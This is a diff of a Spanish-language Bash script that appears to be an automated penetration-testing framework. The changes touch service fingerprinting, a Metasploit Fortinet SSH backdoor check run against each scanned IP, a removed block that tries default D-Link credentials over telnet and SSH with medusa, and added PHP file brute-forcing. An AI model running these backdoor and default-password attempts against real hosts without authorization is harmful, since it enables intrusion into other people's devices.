-	grep --color=never -i ZK * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../servicios/ZKSoftware.txt		
+	grep --color=never -i ZK * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/ZKSoftware.txt		
 
 	#vCenter
-	grep --color=never -i "ID_VC_Welcome" * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../servicios/vCenter.txt
+	grep --color=never -i "ID_VC_Welcome" * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/vCenter.txt
 	
 	
 	#Cisco
-	grep --color=never -i cisco * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../servicios/cisco.txt		
+	grep --color=never -i cisco * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/cisco.txt		
 	
 	#ZTE
-	grep --color=never -i ZTE * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../servicios/ZTE2.txt
+	grep --color=never -i ZTE * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/ZTE2.txt
 	sort ../servicios/ZTE2.txt | uniq > ../servicios/ZTE.txt ; rm ../servicios/ZTE2.txt
 		
 	
 	#zimbra
-	grep --color=never -i zimbra * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../servicios/zimbra.txt
+	grep --color=never -i zimbra * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/zimbra.txt
 	
 	#jboss
-	grep --color=never -i jboss * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../servicios/jboss.txt
+	grep --color=never -i jboss * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/jboss.txt
 	
 	#401
 		#line = http://200.87.193.109:80/phpmyadmin/	
@@ -4084,7 +4146,7 @@ cd .enumeracion2/
 		#line=10.0.0.2:443
 	grep --color=never -i Unauthorized * 2>/dev/null | cut -d "_" -f1-2 | uniq | tr "_" ":"   > ../servicios/web401-2.txt
 	# sort
-	sort ../servicios/web401-2.txt | uniq >> ../servicios/web401.txt
+	sort ../servicios/web401-2.txt | uniq | uniq >> ../servicios/web401.txt
 	rm ../servicios/web401-2.txt
 	
 cd ..
@@ -4340,8 +4402,8 @@ then
 			fi
 			
 			
-			echo "msfconsole -x \"use auxiliary/scanner/ssh/fortinet_backdoor;set RHOSTS $ip;run;exit\"" > logs/vulnerabilidades/"$ip"_22_backdoorFabrica.txt 2>/dev/null		
-			msfconsole -x "use auxiliary/scanner/ssh/fortinet_backdoor;set RHOSTS $ip;run;exit" >> logs/vulnerabilidades/"$ip"_22_backdoorFabrica.txt 2>/dev/null		
+			echo "msfconsole -x \"use auxiliary/scanner/ssh/fortinet_backdoor;set RHOSTS $ip;exploit;exit\"" > logs/vulnerabilidades/"$ip"_22_backdoorFabrica.txt 2>/dev/null		
+			msfconsole -x "use auxiliary/scanner/ssh/fortinet_backdoor;set RHOSTS $ip;exploit;exit" >> logs/vulnerabilidades/"$ip"_22_backdoorFabrica.txt 2>/dev/null		
 			sleep 1
 			
 			respuesta=`grep --color=never Logged logs/vulnerabilidades/"$ip"_22_backdoorFabrica.txt`
@@ -4757,52 +4819,6 @@ then
 fi
 
 
-
-# d-link default password
-if [ -f servicios/d-link.txt ]
-then
-	echo -e "$OKBLUE #################### d-link (`wc -l servicios/d-link.txt`) ######################$RESET"	    
-	while read ip     
-	do     						
-		echo -e "[+] Escaneando $ip"	
-		
-		egrep -iq "23/open" .escaneo_puertos_1000p/"$ip"_tcp.grep
-		greprc=$?
-		if [[ $greprc -eq 0 ]] ; then			
-			echo -e "\t Probando Telnet \n $RESET"
-			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null			
-			medusa -h $ip -u 1234 -p 1234 -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null			
-			medusa -h $ip -u root -p 12345 -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null			
-			medusa -h $ip -u root -p root -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null			
-			respuesta=`grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt `
-			greprc=$?
-			if [[ $greprc -eq 0 ]] ; then
-				echo -n "[D-link] $respuesta" >> .vulnerabilidades/"$ip"_23_passwordDefecto.txt
-			fi	
-			
-			
-		fi		
-
-		egrep -iq "22/open" .escaneo_puertos_1000p/"$ip"_tcp.grep
-		greprc=$?
-		if [[ $greprc -eq 0 ]] ; then			
-			echo -e "\t Probando SSH \n $RESET"
-			medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null			
-			medusa -h $ip -u 1234 -p 1234 -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null			
-			medusa -h $ip -u root -p 12345 -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null			
-			medusa -h $ip -u root -p root -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null			
-			respuesta=`grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt `
-			greprc=$?
-			if [[ $greprc -eq 0 ]] ; then
-				echo -n "[D-link] $respuesta" >> .vulnerabilidades/"$ip"_22_passwordDefecto.txt
-			fi
-		fi					
-				
-		
-		echo ""
- 	done <servicios/d-link.txt	
-	insert_data
-fi
 
 
 
@@ -5349,10 +5365,7 @@ then
 		web_fingerprint=`echo "$web_fingerprint" | tr '[:upper:]' '[:lower:]' | tr -d ";"` # a minusculas y eliminar  ;		
 		#############
 			
-		#if [[ ${line} == *"wp-login"*  ]];then 
-			#https://181.115.188.36:443/wp-login.php   
-			#line=`echo "${line/wp-login.php/}"`				
-		#fi
+
 		echo "$line;$web_fingerprint" >> servicios/admin-web2.txt	
 		
 		if [[ ${path} != *"."* && ${web_fingerprint} != *"index of"* ]];then  # si es un directorio (no un archivo) y el listado de directorios no esta habilitado
@@ -5373,12 +5386,14 @@ then
 fi		
 sort servicios/admin-web2.txt 2>/dev/null | uniq > servicios/admin-web.txt 
 rm servicios/admin-web2.txt 2>/dev/null
-insert_data		
+insert_data	
+
+    
 
 
 # if [ $internet == "n" ]; then 	
 
-if [[ $MODE == "vpn" ]]; then
+if [[ $VPN == "1" ]]; then
 
  echo "Escaneando desde VPN. No snifear"
 
@@ -5514,8 +5529,51 @@ fi
 
 
 
+if [ -f servicios/web.txt ]
+then      
+    echo -e "$OKBLUE #################### WEB PHP(`wc -l servicios/web.txt`) ######################$RESET"	    
+    for line in $(cat servicios/web.txt); do  
+		host=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`		
+		
+        ######## revisar por dominio #######
+        if grep -q "," "$prefijo$IP_LIST_FILE" 2>/dev/null; then			
+	        lista_subdominios=`grep $ip $prefijo$IP_LIST_FILE | egrep 'subdomain|vhost'| cut -d "," -f2`
+	        for subdominio in $lista_subdominios; do	
+
+			###  if the server is apache/nginx ######
+			egrep -i "apache|nginx|kong" .enumeracion2/"$subdominio"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud" # solo el segundo egrep poner "-q"
+			greprc=$?
+			if [[ $greprc -eq 0  ]];then # si el banner es Apache																							
+				echo -e "\t\t[+] Revisando archivos php ($host - Apache/nginx)"
+				web-buster.pl -t $host -p $port -h $hilos_web -d / -m php -s $proto -q 1 | egrep --color=never "^200" > .enumeracion/"$host"_"$port"_webarchivos.txt &
+				sleep 1
+			else
+				echo -e "\t\t[+] No es Apache o no debemos escanear"
+			fi						
+			####################################
+
+		         						
+	        done
+        fi
+    
+	###  if the server is apache ######
+	egrep -i "apache|nginx|kong" .enumeracion2/"$host"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud" # solo el segundo egrep poner "-q"
+	greprc=$?
+	if [[ $greprc -eq 0  ]];then # si el banner es Apache																							
+		echo -e "\t\t[+] Revisando archivos php ($host - Apache/nginx)"
+		web-buster.pl -t $host -p $port -h $hilos_web -d / -m php -s $proto -q 1 | egrep --color=never "^200" > .enumeracion/"$host"_"$port"_webarchivos.txt &
+		sleep 1
+	else
+		echo -e "\t\t[+] No es Apache o no debemos escanear"
+	fi						
+	####################################
+	
+	done # for	
+fi
+
+
 echo -e "\t $OKBLUE REVISANDO ERRORES $RESET"
 #grep -ira "timed out" * logs/enumeracion/* 2>/dev/null | egrep -v "webClone|transfer not allowed" >> errores.log
 #grep -ira "Can't connect" * logs/enumeracion/* 2>/dev/null | egrep -v "webClone|transfer not allowed" >> errores.log
 grep -ira failed logs/vulnerabilidades/* | egrep -v "404 Not Found|Connection refused|No route to host"
-
